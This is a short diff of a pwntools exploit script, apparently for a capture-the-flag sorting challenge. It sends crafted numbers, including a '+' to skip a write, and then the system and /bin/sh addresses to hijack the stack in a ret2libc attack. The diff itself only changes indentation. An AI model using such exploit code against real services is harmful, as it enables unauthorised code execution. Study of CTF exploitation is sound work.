@@ -22,10 +22,10 @@ log.info("/bin/sh: " + hex(bin_sh))
 
 r.sendlineafter(b'sort :', b'35')
 for i in range(24):
-	r.sendlineafter(b'number : ', b'1')
+    r.sendlineafter(b'number : ', b'1')
 r.sendlineafter(b'number : ', b'+')
 for i in range(8):
-	r.sendlineafter(b'number : ', str(system))
+    r.sendlineafter(b'number : ', str(system))
 r.sendlineafter(b'number : ', str(bin_sh))
 r.sendlineafter(b'number : ', str(bin_sh))
 
